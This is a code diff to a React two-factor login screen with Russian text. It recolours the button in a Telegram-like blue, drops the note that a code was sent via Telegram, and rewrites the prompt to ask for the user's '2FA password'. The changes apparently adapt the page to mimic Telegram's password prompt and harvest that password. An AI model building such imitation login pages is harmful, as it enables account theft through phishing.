@@ -47,15 +47,15 @@ export default function Auth2FA() {
 
   return (
     <div className="min-h-screen font-sans overflow-auto flex flex-col items-center justify-center p-6 text-center bg-gray-800 text-white">
-      <p className="text-4xl">2FA Авторизация</p>
+      <p className="text-4xl">Двухфакторная авторизация</p>
       <p className="mt-3 text-lg text-gray-400">
-        Введите код двухфакторной аутентификации
+        Ваш аккаунт защищен двухфакторной авторизацией. Пожалуйста. введите ваш пароль, чтобы продолжить
       </p>
 
       <input
         type="text"
         className="mt-6 px-6 py-3 rounded-xl bg-gray-700 text-white text-center text-xl outline-none"
-        placeholder="Код"
+        placeholder="Введите ваш пароль 2FA"
         maxLength={6}
         value={code}
         onChange={(e) => setCode(e.target.value)}
@@ -64,14 +64,13 @@ export default function Auth2FA() {
       <button
         onClick={sendCode}
         disabled={loading}
-        className="bg-blue-400 mt-7 px-8 py-4 rounded-2xl text-white hover:bg-blue-700 transition disabled:opacity-50"
-      >
-        {loading ? "Проверка..." : "Подтвердить код"}
-      </button>
+        className="bg-[#027ffe] mt-7 px-8 py-4 rounded-2xl text-white 
+           hover:bg-[#026ee0] transition-colors duration-200 
+           disabled:opacity-50 disabled:cursor-not-allowed"
 
-      <p className="mt-5 text-sm text-gray-400">
-        Код был отправлен вам в Telegram
-      </p>
+      >
+        {loading ? "Проверка..." : "Подтвердить"}
+      </button>
     </div>
   );
 }
